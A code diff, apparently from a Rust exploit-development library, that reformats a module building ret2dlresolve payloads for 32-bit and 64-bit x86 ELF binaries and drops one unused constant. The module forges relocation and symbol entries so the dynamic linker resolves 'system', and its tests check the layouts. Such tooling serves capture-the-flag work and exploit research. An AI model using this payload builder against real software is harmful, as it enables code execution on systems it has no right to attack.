@@ -97,8 +97,6 @@ const DT_JMPREL: u64 = 23;
 const DT_SYMTAB: u64 = 6;
 /// DT_STRTAB (5) -- base address of `.dynstr`
 const DT_STRTAB: u64 = 5;
-/// DT_PLTREL (20) -- reloc type used by PLT (DT_REL=17 or DT_RELA=7)
-const DT_PLTREL: u64 = 20;
 /// DT_FLAGS (30)
 const DT_FLAGS: u64 = 30;
 /// DT_FLAGS_1 (0x6ffffffb)
@@ -121,9 +119,7 @@ fn check_lazy_binding(binary: &Binary) -> Result<(), String> {
   });
 
   if has_bind_now {
-    return Err(
-      "binary uses BIND_NOW (Full RELRO); ret2dlresolve requires lazy binding".into(),
-    );
+    return Err("binary uses BIND_NOW (Full RELRO); ret2dlresolve requires lazy binding".into());
   }
   Ok(())
 }
@@ -172,28 +168,22 @@ impl Ret2dlresolve32 {
   /// - The binary uses Full RELRO / BIND_NOW
   pub fn from_binary(binary: &Binary) -> Result<Self, String> {
     if binary.bits != 32 {
-      return Err(format!(
-        "expected 32-bit binary, got {}-bit",
-        binary.bits
-      ));
+      return Err(format!("expected 32-bit binary, got {}-bit", binary.bits));
     }
     if binary.arch != Architecture::X86 {
-      return Err(format!(
-        "expected x86 architecture, got {}",
-        binary.arch
-      ));
+      return Err(format!("expected x86 architecture, got {}", binary.arch));
     }
 
     check_lazy_binding(binary)?;
 
-    let rel_plt_addr = find_dynamic(binary, DT_JMPREL)
-      .ok_or("DT_JMPREL not found in dynamic section")?;
+    let rel_plt_addr =
+      find_dynamic(binary, DT_JMPREL).ok_or("DT_JMPREL not found in dynamic section")?;
 
-    let dynsym_addr = find_dynamic(binary, DT_SYMTAB)
-      .ok_or("DT_SYMTAB not found in dynamic section")?;
+    let dynsym_addr =
+      find_dynamic(binary, DT_SYMTAB).ok_or("DT_SYMTAB not found in dynamic section")?;
 
-    let dynstr_addr = find_dynamic(binary, DT_STRTAB)
-      .ok_or("DT_STRTAB not found in dynamic section")?;
+    let dynstr_addr =
+      find_dynamic(binary, DT_STRTAB).ok_or("DT_STRTAB not found in dynamic section")?;
 
     let plt0_addr = find_plt0(binary)?;
 
@@ -219,11 +209,7 @@ impl Ret2dlresolve32 {
   /// +pad   Elf32_Sym   (16 bytes)
   /// +sym   "system\0"  (symbol string, null-terminated)
   /// ```
-  pub fn build_payload(
-    &self,
-    writable_addr: u64,
-    target_symbol: &str,
-  ) -> Ret2dlresolvePayload {
+  pub fn build_payload(&self, writable_addr: u64, target_symbol: &str) -> Ret2dlresolvePayload {
     let mut data: Vec<u8> = Vec::new();
 
     // -- Step 1: Reserve space for Elf32_Rel (we'll fill it after alignment) --
@@ -252,8 +238,7 @@ impl Ret2dlresolve32 {
     data.extend(std::iter::repeat(0u8).take(pad));
 
     let fake_sym_addr = writable_addr + data.len() as u64;
-    let sym_index =
-      (fake_sym_addr - self.dynsym_addr) / self.sym_entry_size as u64;
+    let sym_index = (fake_sym_addr - self.dynsym_addr) / self.sym_entry_size as u64;
 
     // -- Step 3: Build Elf32_Sym --
     // st_name will be filled after we know the string offset
@@ -272,16 +257,15 @@ impl Ret2dlresolve32 {
     // -- Step 5: Fill in the Elf32_Sym --
     let sym_bytes = {
       let mut s = Vec::with_capacity(ELF32_SYM_SIZE);
-      s.extend_from_slice(&p32(st_name));   // st_name
-      s.extend_from_slice(&p32(0));         // st_value
-      s.extend_from_slice(&p32(0));         // st_size
-      s.push(STI_GLOBAL_FUNC);             // st_info  (STB_GLOBAL | STT_FUNC)
-      s.push(0);                            // st_other
-      s.extend_from_slice(&[0u8; 2]);       // st_shndx = SHN_UNDEF
+      s.extend_from_slice(&p32(st_name)); // st_name
+      s.extend_from_slice(&p32(0)); // st_value
+      s.extend_from_slice(&p32(0)); // st_size
+      s.push(STI_GLOBAL_FUNC); // st_info  (STB_GLOBAL | STT_FUNC)
+      s.push(0); // st_other
+      s.extend_from_slice(&[0u8; 2]); // st_shndx = SHN_UNDEF
       s
     };
-    data[sym_offset_in_data..sym_offset_in_data + ELF32_SYM_SIZE]
-      .copy_from_slice(&sym_bytes);
+    data[sym_offset_in_data..sym_offset_in_data + ELF32_SYM_SIZE].copy_from_slice(&sym_bytes);
 
     // -- Step 6: Fill in the Elf32_Rel --
     // r_info = (sym_index << 8) | R_386_JMP_SLOT
@@ -293,7 +277,7 @@ impl Ret2dlresolve32 {
     let rel_bytes = {
       let mut r = Vec::with_capacity(ELF32_REL_SIZE);
       r.extend_from_slice(&p32(resolved_addr_location as u32)); // r_offset
-      r.extend_from_slice(&p32(r_info));                        // r_info
+      r.extend_from_slice(&p32(r_info)); // r_info
       r
     };
     data[0..ELF32_REL_SIZE].copy_from_slice(&rel_bytes);
@@ -382,28 +366,22 @@ impl Ret2dlresolve64 {
   /// - The binary uses Full RELRO / BIND_NOW
   pub fn from_binary(binary: &Binary) -> Result<Self, String> {
     if binary.bits != 64 {
-      return Err(format!(
-        "expected 64-bit binary, got {}-bit",
-        binary.bits
-      ));
+      return Err(format!("expected 64-bit binary, got {}-bit", binary.bits));
     }
     if binary.arch != Architecture::X86_64 {
-      return Err(format!(
-        "expected x86_64 architecture, got {}",
-        binary.arch
-      ));
+      return Err(format!("expected x86_64 architecture, got {}", binary.arch));
     }
 
     check_lazy_binding(binary)?;
 
-    let rela_plt_addr = find_dynamic(binary, DT_JMPREL)
-      .ok_or("DT_JMPREL not found in dynamic section")?;
+    let rela_plt_addr =
+      find_dynamic(binary, DT_JMPREL).ok_or("DT_JMPREL not found in dynamic section")?;
 
-    let dynsym_addr = find_dynamic(binary, DT_SYMTAB)
-      .ok_or("DT_SYMTAB not found in dynamic section")?;
+    let dynsym_addr =
+      find_dynamic(binary, DT_SYMTAB).ok_or("DT_SYMTAB not found in dynamic section")?;
 
-    let dynstr_addr = find_dynamic(binary, DT_STRTAB)
-      .ok_or("DT_STRTAB not found in dynamic section")?;
+    let dynstr_addr =
+      find_dynamic(binary, DT_STRTAB).ok_or("DT_STRTAB not found in dynamic section")?;
 
     let plt0_addr = find_plt0(binary)?;
 
@@ -429,11 +407,7 @@ impl Ret2dlresolve64 {
   /// +pad   Elf64_Sym   (24 bytes)
   /// +sym   "system\0"  (symbol string, null-terminated)
   /// ```
-  pub fn build_payload(
-    &self,
-    writable_addr: u64,
-    target_symbol: &str,
-  ) -> Ret2dlresolvePayload {
+  pub fn build_payload(&self, writable_addr: u64, target_symbol: &str) -> Ret2dlresolvePayload {
     let mut data: Vec<u8> = Vec::new();
 
     // -- Step 1: Reserve space for Elf64_Rela (filled later) --
@@ -441,8 +415,7 @@ impl Ret2dlresolve64 {
     data.extend_from_slice(&[0u8; ELF64_RELA_SIZE]);
 
     // On x86_64 the PLT stub passes an *index* (not byte offset)
-    let reloc_index =
-      (fake_rela_addr - self.rela_plt_addr) / ELF64_RELA_SIZE as u64;
+    let reloc_index = (fake_rela_addr - self.rela_plt_addr) / ELF64_RELA_SIZE as u64;
 
     // -- Step 2: Align for Elf64_Sym --
     // The dynamic linker indexes .dynsym as: &dynsym[sym_index * 24]
@@ -461,8 +434,7 @@ impl Ret2dlresolve64 {
     data.extend(std::iter::repeat(0u8).take(pad));
 
     let fake_sym_addr = writable_addr + data.len() as u64;
-    let sym_index =
-      (fake_sym_addr - self.dynsym_addr) / self.sym_entry_size as u64;
+    let sym_index = (fake_sym_addr - self.dynsym_addr) / self.sym_entry_size as u64;
 
     // -- Step 3: Build Elf64_Sym --
     let sym_offset_in_data = data.len();
@@ -481,16 +453,15 @@ impl Ret2dlresolve64 {
     // -- Step 5: Fill in the Elf64_Sym --
     let sym_bytes = {
       let mut s = Vec::with_capacity(ELF64_SYM_SIZE);
-      s.extend_from_slice(&p32(st_name));   // st_name  (4)
-      s.push(STI_GLOBAL_FUNC);             // st_info  (1)
-      s.push(0);                            // st_other (1)
-      s.extend_from_slice(&[0u8; 2]);       // st_shndx (2) = SHN_UNDEF
-      s.extend_from_slice(&p64(0));         // st_value (8)
-      s.extend_from_slice(&p64(0));         // st_size  (8)
+      s.extend_from_slice(&p32(st_name)); // st_name  (4)
+      s.push(STI_GLOBAL_FUNC); // st_info  (1)
+      s.push(0); // st_other (1)
+      s.extend_from_slice(&[0u8; 2]); // st_shndx (2) = SHN_UNDEF
+      s.extend_from_slice(&p64(0)); // st_value (8)
+      s.extend_from_slice(&p64(0)); // st_size  (8)
       s
     };
-    data[sym_offset_in_data..sym_offset_in_data + ELF64_SYM_SIZE]
-      .copy_from_slice(&sym_bytes);
+    data[sym_offset_in_data..sym_offset_in_data + ELF64_SYM_SIZE].copy_from_slice(&sym_bytes);
 
     // -- Step 6: Fill in the Elf64_Rela --
     // r_info = (sym_index << 32) | R_X86_64_JUMP_SLOT(7)
@@ -501,8 +472,8 @@ impl Ret2dlresolve64 {
     let rela_bytes = {
       let mut r = Vec::with_capacity(ELF64_RELA_SIZE);
       r.extend_from_slice(&p64(resolved_addr_location)); // r_offset  (8)
-      r.extend_from_slice(&p64(r_info));                  // r_info    (8)
-      r.extend_from_slice(&p64(0));                       // r_addend  (8)
+      r.extend_from_slice(&p64(r_info)); // r_info    (8)
+      r.extend_from_slice(&p64(0)); // r_addend  (8)
       r
     };
     data[0..ELF64_RELA_SIZE].copy_from_slice(&rela_bytes);
@@ -604,12 +575,12 @@ mod tests {
   fn test_elf32_sym_layout() {
     let mut sym = Vec::new();
     let st_name: u32 = 0x100;
-    sym.extend_from_slice(&p32(st_name));   // st_name
-    sym.extend_from_slice(&p32(0));         // st_value
-    sym.extend_from_slice(&p32(0));         // st_size
-    sym.push(STI_GLOBAL_FUNC);             // st_info
-    sym.push(0);                            // st_other
-    sym.extend_from_slice(&[0u8; 2]);       // st_shndx
+    sym.extend_from_slice(&p32(st_name)); // st_name
+    sym.extend_from_slice(&p32(0)); // st_value
+    sym.extend_from_slice(&p32(0)); // st_size
+    sym.push(STI_GLOBAL_FUNC); // st_info
+    sym.push(0); // st_other
+    sym.extend_from_slice(&[0u8; 2]); // st_shndx
     assert_eq!(sym.len(), ELF32_SYM_SIZE);
     assert_eq!(sym[12], 0x12); // STB_GLOBAL | STT_FUNC
   }
@@ -631,12 +602,12 @@ mod tests {
   fn test_elf64_sym_layout() {
     let mut sym = Vec::new();
     let st_name: u32 = 0x200;
-    sym.extend_from_slice(&p32(st_name));   // st_name  (4)
-    sym.push(STI_GLOBAL_FUNC);             // st_info  (1)
-    sym.push(0);                            // st_other (1)
-    sym.extend_from_slice(&[0u8; 2]);       // st_shndx (2)
-    sym.extend_from_slice(&p64(0));         // st_value (8)
-    sym.extend_from_slice(&p64(0));         // st_size  (8)
+    sym.extend_from_slice(&p32(st_name)); // st_name  (4)
+    sym.push(STI_GLOBAL_FUNC); // st_info  (1)
+    sym.push(0); // st_other (1)
+    sym.extend_from_slice(&[0u8; 2]); // st_shndx (2)
+    sym.extend_from_slice(&p64(0)); // st_value (8)
+    sym.extend_from_slice(&p64(0)); // st_size  (8)
     assert_eq!(sym.len(), ELF64_SYM_SIZE);
     assert_eq!(sym[4], 0x12); // STB_GLOBAL | STT_FUNC
   }
@@ -696,8 +667,7 @@ mod tests {
     assert_eq!(payload.plt0_addr, 0x00400500);
 
     // reloc_index = (fake_rela_addr - rela_plt_addr) / 24
-    let expected_index =
-      (writable - resolver.rela_plt_addr) / ELF64_RELA_SIZE as u64;
+    let expected_index = (writable - resolver.rela_plt_addr) / ELF64_RELA_SIZE as u64;
     assert_eq!(payload.reloc_index, expected_index);
 
     // The data must contain the string "system\0"
@@ -756,15 +726,12 @@ mod tests {
       assert_eq!(rel_type, R_JMP_SLOT);
 
       // Verify the sym is at an aligned location
-      let computed_sym_addr =
-        resolver.dynsym_addr + (sym_index as u64) * ELF32_SYM_SIZE as u64;
-      let actual_sym_addr = writable + ELF32_REL_SIZE as u64
-        + {
-          let unaligned = writable + ELF32_REL_SIZE as u64;
-          let mis = (unaligned.wrapping_sub(resolver.dynsym_addr)) as usize
-            % ELF32_SYM_SIZE;
-          (if mis == 0 { 0 } else { ELF32_SYM_SIZE - mis }) as u64
-        };
+      let computed_sym_addr = resolver.dynsym_addr + (sym_index as u64) * ELF32_SYM_SIZE as u64;
+      let actual_sym_addr = writable + ELF32_REL_SIZE as u64 + {
+        let unaligned = writable + ELF32_REL_SIZE as u64;
+        let mis = (unaligned.wrapping_sub(resolver.dynsym_addr)) as usize % ELF32_SYM_SIZE;
+        (if mis == 0 { 0 } else { ELF32_SYM_SIZE - mis }) as u64
+      };
       assert_eq!(
         computed_sym_addr, actual_sym_addr,
         "sym alignment mismatch at writable offset {offset}"
@@ -802,15 +769,12 @@ mod tests {
       let rel_type = (r_info & 0xffffffff) as u32;
       assert_eq!(rel_type, R_JMP_SLOT);
 
-      let computed_sym_addr =
-        resolver.dynsym_addr + sym_index * ELF64_SYM_SIZE as u64;
-      let actual_sym_addr = writable + ELF64_RELA_SIZE as u64
-        + {
-          let unaligned = writable + ELF64_RELA_SIZE as u64;
-          let mis = (unaligned.wrapping_sub(resolver.dynsym_addr)) as usize
-            % ELF64_SYM_SIZE;
-          (if mis == 0 { 0 } else { ELF64_SYM_SIZE - mis }) as u64
-        };
+      let computed_sym_addr = resolver.dynsym_addr + sym_index * ELF64_SYM_SIZE as u64;
+      let actual_sym_addr = writable + ELF64_RELA_SIZE as u64 + {
+        let unaligned = writable + ELF64_RELA_SIZE as u64;
+        let mis = (unaligned.wrapping_sub(resolver.dynsym_addr)) as usize % ELF64_SYM_SIZE;
+        (if mis == 0 { 0 } else { ELF64_SYM_SIZE - mis }) as u64
+      };
       assert_eq!(
         computed_sym_addr, actual_sym_addr,
         "sym alignment mismatch at writable offset {offset}"
